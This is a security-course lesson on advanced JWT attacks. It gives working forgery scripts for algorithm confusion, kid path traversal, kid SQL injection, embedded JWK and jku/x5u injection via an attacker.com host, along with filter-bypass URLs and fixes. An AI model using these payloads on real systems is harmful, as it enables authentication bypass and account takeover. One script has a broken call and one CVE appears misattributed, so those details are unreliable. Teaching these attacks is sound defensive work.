---
title: "JWT Advanced Attacks — Algorithm Confusion, kid Injection, JWK Embedding, x5u Redirect"
tags: [JWT, algorithm-confusion, kid-injection, JWK-injection, x5u, jku, RS256-HS256,
       path-traversal, SQL-injection, token-forgery, ATT&CK-T1550, CWE-347]
module: 04-BroadSurface-01
day: 169
related_topics:
  - JWT Basics and alg:none (Day 42)
  - OAuth Advanced Attacks (Day 138)
  - JWT Advanced Lab (Day 170)
  - Account Takeover Chains (Day 174)
---

# Day 169 — JWT Advanced Attacks

> "Day 42 you learned alg:none and RS256→HS256. Those are the classics.
> Today you learn the attacks that still work in 2024 because developers
> trust kid values without sanitisation and trust JWK headers without
> validation. Same category of mistake — user-controlled data being treated
> as trusted configuration. Different surface. Same principle."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Execute an RS256-to-HS256 algorithm confusion attack to forge a JWT using
   the public key as an HMAC secret.
2. Exploit a `kid` (Key ID) parameter via path traversal to load a
   predictable file as the signing secret.
3. Exploit `kid` via SQL injection to control the returned key material.
4. Inject a self-signed JWK directly into the JWT header to bypass signature
   validation.
5. Exploit `jku` and `x5u` header injection to host a malicious JWK Set or
   certificate and force the server to use it.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| JWT structure (header, payload, signature) | Day 42 |
| RS256 vs HS256 mechanics | Day 42 |
| Basic Python and cryptography | Days 34–35 |
| Path traversal concepts | Day 113 |
| SQL injection | Days 76–79 |

---

## JWT Review

A JWT is three base64url-encoded parts separated by dots:

```
HEADER.PAYLOAD.SIGNATURE
```

```json
// Header
{"alg": "RS256", "typ": "JWT", "kid": "key-2024-01"}

// Payload
{"sub": "user_123", "role": "user", "exp": 1703980800}

// Signature
RSASHA256(base64url(header) + "." + base64url(payload), private_key)
```

The server verifies by:
1. Reading `alg` from the header
2. Locating the key identified by `kid` (or using the only configured key)
3. Verifying the signature using that algorithm and key

Every attack in this lesson exploits the server's trust in values from the JWT
header itself — values the attacker controls.

---

## Attack 1 — RS256 → HS256 Algorithm Confusion

**Day 42 recap:** if a server uses RS256 (asymmetric — sign with private key,
verify with public key) but also accepts HS256 (symmetric — sign and verify
with the same secret), the attacker can:

1. Obtain the server's RS256 public key (often published at `/jwks.json`)
2. Create a new JWT with `"alg": "HS256"`
3. Sign it with HS256 using the **public key bytes as the HMAC secret**
4. The server validates with HS256 using the same public key → valid!

**Why it works:** the server's HMAC verification path uses the public key as
the secret key — both the attacker and the server use the same bytes.

### Step-by-step exploit

```python
#!/usr/bin/env python3
"""RS256 → HS256 algorithm confusion."""
import base64
import json
import hmac
import hashlib
import requests

TARGET = "https://target.com"

# Step 1: Fetch the RS256 public key
jwks = requests.get(f"{TARGET}/.well-known/jwks.json").json()
pub_key_bytes = base64.b64decode(jwks["keys"][0]["x5c"][0])
# Alternative: fetch from /api/auth/public-key and decode PEM
# from cryptography.hazmat.primitives.serialization import load_pem_public_key

# Step 2: Construct the forged payload
header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "exp": 9999999999}

def b64url(data: bytes | dict) -> str:
    if isinstance(data, dict):
        data = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header_b64  = b64url(header)
payload_b64 = b64url(payload)
signing_input = f"{header_b64}.{payload_b64}".encode()

# Step 3: Sign with HS256 using the public key bytes as the secret
sig = hmac.new(pub_key_bytes, signing_input, hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()

forged_token = f"{header_b64}.{payload_b64}.{sig_b64}"
print(f"[+] Forged token: {forged_token[:80]}...")

# Step 4: Test the token
r = requests.get(f"{TARGET}/api/admin/users",
                 headers={"Authorization": f"Bearer {forged_token}"})
print(f"[+] Response: {r.status_code} — {r.text[:200]}")
```

**Tool:** `jwt_tool.py` automates this: `python3 jwt_tool.py <token> -X a`

**Fix:** reject the `alg` header value entirely. The server should have a
hardcoded algorithm — never trust the algorithm from the JWT header.

---

## Attack 2 — `kid` Path Traversal

The `kid` field in the JWT header is a hint to the server: "use this key to
verify the signature." If the server uses `kid` to load a file from disk
without sanitisation, path traversal applies.

**Vulnerable server code:**

```python
import jwt
from pathlib import Path

def verify_token(token: str) -> dict:
    header = jwt.get_unverified_header(token)
    kid = header["kid"]                            # UNSANITISED
    key_path = Path(f"/app/keys/{kid}.pem")        # PATH TRAVERSAL
    secret = key_path.read_text()
    return jwt.decode(token, secret, algorithms=["HS256"])
```

**Attack:** set `kid` to a path traversal string that resolves to a file with
predictable content. The most reliable target is `/dev/null` (empty file) or
`/proc/sys/kernel/hostname`.

```python
import jwt

# /dev/null is an empty file — HMAC with empty key is predictable
kid_traversal = "../../../../../../dev/null"
forged = jwt.encode(
    {"sub": "admin", "role": "admin"},
    "",                     # empty key = HMAC of empty bytes
    algorithm="HS256",
    headers={"kid": kid_traversal},
)
print(forged)
```

**More reliable:** use `/proc/sys/kernel/randomize_va_space` — its content is
always `2\n` on a standard Linux system.

```python
# Key content = "2\n"
forged = jwt.encode(
    {"sub": "admin"},
    "2",                    # match the file content
    algorithm="HS256",
    headers={"kid": "../../proc/sys/kernel/randomize_va_space"},
)
```

**Real-world case:** CVE-2022-39227 — `python-jwt` library allowed arbitrary
`kid` path traversal. Fixed in version 3.3.4.

### Fix

```python
import re

def sanitize_kid(kid: str) -> str:
    # Only allow alphanumeric, dash, underscore
    if not re.fullmatch(r"[a-zA-Z0-9_-]{1,64}", kid):
        raise ValueError("Invalid kid format")
    return kid
```

---

## Attack 3 — `kid` SQL Injection

If the server fetches the key from a database using the `kid` value:

**Vulnerable server code:**

```python
def get_key_by_kid(kid: str) -> str:
    # VULNERABLE: kid directly interpolated into SQL
    row = db.execute(f"SELECT key FROM jwt_keys WHERE id = '{kid}'").fetchone()
    return row[0] if row else None
```

**Attack:** inject a SQL UNION to return an attacker-chosen key value:

```python
kid_sqli = "nonexistent' UNION SELECT 'attacker_chosen_secret'-- -"

forged = jwt.encode(
    {"sub": "admin", "role": "admin"},
    "attacker_chosen_secret",   # matches the value returned by the injection
    algorithm="HS256",
    headers={"kid": kid_sqli},
)
```

The database returns `attacker_chosen_secret` as the key. The server uses it
to verify. The attacker used the same value to sign. Verification passes.

**Fix:** use parameterised queries for all key lookups:

```python
row = db.execute("SELECT key FROM jwt_keys WHERE id = ?", (kid,)).fetchone()
```

---

## Attack 4 — JWK Header Injection (Embedded JWK)

Some servers support embedding the signing key directly in the JWT header via
the `jwk` parameter. If the server uses this embedded key to verify the
signature (without checking it against a trusted key set), the attacker can
sign with their own private key and include their own public key.

**Vulnerable server code:**

```python
def verify_token_jwk(token: str) -> dict:
    header = jwt.get_unverified_header(token)
    if "jwk" in header:
        pub_key = load_jwk(header["jwk"])       # Using attacker-supplied key!
    else:
        pub_key = load_from_keystore()
    return jwt.decode(token, pub_key, algorithms=["RS256"])
```

**Attack:**

```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk, jwt as jose_jwt
import json, base64

# Generate an attacker-controlled RSA key pair
private_key = rsa.generate_private_key(
    public_exponent=65537, key_size=2048, backend=default_backend()
)
public_key = private_key.public_key()

# Export public key as JWK
pub_numbers = public_key.public_key().public_numbers()

def b64url_int(n: int) -> str:
    length = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(length, "big")).rstrip(b"=").decode()

attacker_jwk = {
    "kty": "RSA",
    "n": b64url_int(pub_numbers.n),
    "e": b64url_int(pub_numbers.e),
}

# Create header with embedded JWK
header = {"alg": "RS256", "typ": "JWT", "jwk": attacker_jwk}
payload = {"sub": "admin", "role": "admin", "exp": 9999999999}

# Sign with attacker's private key
token = jose_jwt.encode(payload, private_key, algorithm="RS256",
                        headers={"jwk": attacker_jwk})
print(f"[+] JWK-injected token: {token[:80]}...")
```

**Tool:** `jwt_tool.py -X i` performs this automatically.

**Real-world case:** CVE-2022-21449 ("Psychic Signatures" in Java) — Java's
ECDSA signature verification accepted a signature of all zeros for any payload.
While not JWK injection, it shares the root cause: trusting key material without
validation.

**Fix:** never use the `jwk` header field from the token to fetch the
verification key. Always load the key from the server's own trusted keystore,
matched only by `kid`.

---

## Attack 5 — `jku` / `x5u` Header Injection

The `jku` (JWK Set URL) header parameter tells the server to fetch a JWK Set
from a URL and use one of its keys for verification. The `x5u` parameter
similarly points to an X.509 certificate chain.

**Vulnerable server code:**

```python
def verify_token_jku(token: str) -> dict:
    header = jwt.get_unverified_header(token)
    if "jku" in header:
        jwks = requests.get(header["jku"]).json()    # Fetches attacker's URL!
        pub_key = load_first_jwk(jwks)
    return jwt.decode(token, pub_key, algorithms=["RS256"])
```

**Attack:**

1. Generate an RSA key pair (as above).
2. Host a JWK Set containing your public key at `https://attacker.com/jwks.json`.
3. Create a JWT with `"jku": "https://attacker.com/jwks.json"`.
4. Sign with your private key.

The server fetches your JWK Set, finds your public key, and uses it to verify
the signature → passes.

```python
# Host this file at https://attacker.com/jwks.json:
jwks_response = {
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "attacker-key-1",
            "n": b64url_int(pub_numbers.n),
            "e": b64url_int(pub_numbers.e),
        }
    ]
}

# JWT header with jku pointing to attacker server
header = {"alg": "RS256", "typ": "JWT", "kid": "attacker-key-1",
          "jku": "https://attacker.com/jwks.json"}
```

**Bypass filter trick:** if the server checks that `jku` starts with the
expected domain:

```python
# Bypass: if filter only checks startswith("https://target.com")
jku = "https://target.com.attacker.com/jwks.json"

# Bypass: if filter only checks contains("target.com")
jku = "https://attacker.com/target.com/jwks.json"

# Bypass: if filter is a redirect and doesn't follow
# Host a redirect at: https://target.com/redirect?url=https://attacker.com/jwks.json
jku = "https://target.com/redirect?url=https://attacker.com/jwks.json"
```

**Fix:** never fetch keys from URLs in JWT headers. Maintain an explicit
whitelist of key URLs or use only the server's local keystore.

---

## Summary Table

| Attack | What is controlled | Condition needed | Tool |
|---|---|---|---|
| RS256 → HS256 confusion | Algorithm | Server accepts both alg values | jwt_tool `-X a` |
| `kid` path traversal | Key file path | Server loads key from filesystem by kid | jwt_tool `-I -hc kid -hv "../../dev/null"` |
| `kid` SQL injection | Key database query | Server queries DB with unsanitised kid | Manual payload |
| JWK header injection | Verification key | Server uses embedded `jwk` header | jwt_tool `-X i` |
| `jku` injection | JWK Set URL | Server fetches JWK from `jku` header | Manual + hosted JWK |
| `x5u` injection | Certificate URL | Server fetches cert from `x5u` header | Manual + hosted cert |
| `alg:none` | Algorithm | Server accepts unsigned tokens | jwt_tool `-X n` |

---

## Key Takeaways

1. **All JWT attacks exploit header values that the server trusts.** The header
   is part of the token — it is attacker-controlled. Never use it to select
   the signing algorithm or key.
2. **The fix for every JWT attack is the same:** the server must have the
   algorithm and key pre-configured. The JWT header is only used for routing
   (which `kid` to use), never for trust decisions.
3. **`kid` is an injection surface.** It goes into filesystem paths, SQL
   queries, and HTTP requests depending on the implementation. Treat it as
   untrusted input: validate format, use parameterised queries, use exact
   matches against a pre-loaded key map.
4. **`jku` / `x5u` injection is essentially SSRF.** It makes the server fetch
   an attacker-controlled URL. The SSRF fix applies: allowlist trusted URLs.
5. **jwt_tool.py automates most of these.** But you must understand the attack
   before running the tool. A tool user is not a security engineer.

---

## Exercises

1. Download `jwt_tool.py`. Run it against a test JWT. Use `-X a` (alg
   confusion), `-X i` (JWK inject), and `-X n` (alg:none) modes. For each,
   identify which condition must be true on the server for the attack to
   succeed.
2. Set up a local Flask server that loads the JWT verification key from a file
   using the `kid` value without sanitisation. Exploit it using the path
   traversal technique targeting `/dev/null`.
3. Write the Python code that fixes the `kid` path traversal: validate the
   `kid` against a pre-loaded dictionary mapping kid values to key objects.
   The lookup must never touch the filesystem.
4. Find a real CVE from 2020–2024 that involves JWT algorithm confusion or
   key injection. Summarise: affected library/product, root cause, patch.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q169.1, Q169.2 …).
> Follow-up questions use hierarchical numbering (Q169.1.1, Q169.1.2 …).

---

## Navigation

← Previous: [Day 168 — Credential Attack Lab](DAY-0168-Credential-Attack-Lab.md)
→ Next: [Day 170 — JWT Advanced Lab](DAY-0170-JWT-Advanced-Lab.md)
